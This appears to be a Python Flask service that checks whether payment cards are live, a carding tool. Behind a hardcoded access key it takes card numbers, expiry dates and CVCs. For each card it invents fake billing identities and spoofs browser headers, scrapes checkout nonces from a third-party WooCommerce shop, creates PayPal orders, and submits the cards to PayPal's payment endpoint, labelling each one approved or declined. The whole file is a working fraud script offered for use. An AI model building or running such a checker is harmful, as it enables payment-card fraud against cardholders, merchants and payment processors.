import os
import requests
import re
import random
import string
import json
from flask import Flask, request, jsonify
from requests_toolbelt.multipart.encoder import MultipartEncoder
import user_agent

# Initialize Flask app
app = Flask(__name__)

# --- Helper functions ---
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    index = random.randint(0, len(cities) - 1)
    return (
        cities[index],
        states[index],
        f"{random.randint(1, 999)} {random.choice(streets)}",
        zip_codes[index],
    )

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=15)) + str(random.randint(1000,9999)) + "@gmail.com"

def generate_phone_number():
    return f"303{''.join(random.choices(string.digits, k=7))}"

# --- Main checking logic ---
def check_card(card_details):
    try:
        n, mm, yy, cvc = card_details.strip().split('|')
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        r = requests.session()

        # Generate fake billing info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()

        # 1. Add to cart
        multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
        r.post(
            'https://switchupcb.com/shop/i-buy/',
            headers={'user-agent': user, 'content-type': multipart_data.content_type},
            data=multipart_data,
            timeout=15
        )

        # 2. Get checkout tokens
        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=15)
        try:
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
        except AttributeError:
            return {"message": "DECLINED ❌", "response_text": "ERROR: SCRAPE_FAILED"}

        # 3. Create PayPal Order
        json_data_create = {
            'nonce': create,
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        }
        try:
            response_create = r.post(
                'https://switchupcb.com/?wc-ajax=ppc-create-order',
                json=json_data_create,
                headers={'user-agent': user},
                timeout=15
            )
            order_data = response_create.json()
        except Exception:
            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_FAILED"}

        if 'data' not in order_data or 'id' not in order_data['data']:
            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_INVALID"}

        paypal_id = order_data['data']['id']

        # 4. Final GraphQL payment request to PayPal
        json_data_graphql = {
            'query': 'mutation payWithCard($token: String!, $card: CardInput!) { approveGuestPaymentWithCreditCard(token: $token, card: $card) { flags { is3DSecureRequired } } }',
            'variables': {
                'token': paypal_id,
                'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc},
            }
        }
        try:
            response_final = requests.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                headers={'user-agent': user, 'content-type': 'application/json'},
                json=json_data_graphql,
                timeout=15
            )
            raw_json = response_final.json()
        except Exception:
            return {"message": "DECLINED ❌", "response_text": "ERROR: FINAL_REQ_FAILED"}

        # Extract only the first error code
        if "errors" in raw_json and len(raw_json["errors"]) > 0:
            err = raw_json["errors"][0]
            code = ""
            if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
                code = err["data"][0].get("code", "")
            error_text = f"ERROR: {code}"
        else:
            error_text = "ERROR: UNKNOWN"

        # --- Decide clean message ---
        # --- Decide clean message ---
        if "is3DSecureRequired" in response_final.text:
            return {"message": "✅APPROVED", "response_text": "3ds_Required"}

        elif any(x in response_final.text for x in [
            "succeeded", "Thank You", "ADD_SHIPPING_ERROR",
            "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED",
            "INVALID_BILLING_ADDRESS"
        ]):
            return {"message": "✅APPROVED", "response_text": error_text}

        else:
            return {"message": "❌DECLINED", "response_text": error_text}

    except Exception as e:
        return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}


# --- API Endpoint ---
@app.route('/api', methods=['GET'])
def api_check():
    gateway = request.args.get('gateway')
    key = request.args.get('key')
    card_info = request.args.get('cc')

    # Key validation
    if key != "payalismy":
        return jsonify({"message": "ACCESS DENIED ❌", "response_text": "ERROR: INVALID_KEY"}), 403

    if not card_info:
        return jsonify({"message": "❌DECLINED", "response_text": "ERROR: MISSING_PARAM"}), 400
    if len(card_info.split('|')) != 4:
        return jsonify({"message": "❌DECLINED", "response_text": "ERROR: INVALID_FORMAT"}), 400
    
    result = check_card(card_info)
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
